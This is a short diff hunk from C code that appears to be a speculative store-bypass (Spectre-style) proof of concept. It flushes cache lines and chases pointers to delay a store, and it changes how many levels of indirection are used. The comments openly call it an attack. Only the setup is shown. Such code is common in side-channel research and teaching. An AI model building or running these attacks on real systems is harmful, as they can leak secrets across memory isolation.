@@ -55,21 +55,21 @@ char access_array(int x) {
   _mm_mfence();
   char** data_slowptr = &data;
   char*** data_slowslowptr = &data_slowptr;
-  char**** data_ultraslowptr = &data_slowslowptr;
+  //char**** data_ultraslowptr = &data_slowslowptr;
   _mm_mfence();
   _mm_clflush(&x);
   _mm_clflush(data_slowptr);
   _mm_clflush(&data_slowptr);
   _mm_clflush(data_slowslowptr);
   _mm_clflush(&data_slowslowptr);
-  _mm_clflush(data_ultraslowptr);
-  _mm_clflush(&data_ultraslowptr);
+  //_mm_clflush(data_ultraslowptr);
+  //_mm_clflush(&data_ultraslowptr);
   // ensure data is flushed at this point
   _mm_mfence();
 
   // overwrite data via different pointer
   // pointer chasing makes this extremely slow
-  (*(*(*data_ultraslowptr)))[x] = OVERWRITE;
+  (*(*data_slowslowptr))[x] = OVERWRITE;
 
   // data[x] should now be "#"
   // uncomment next line to break attack
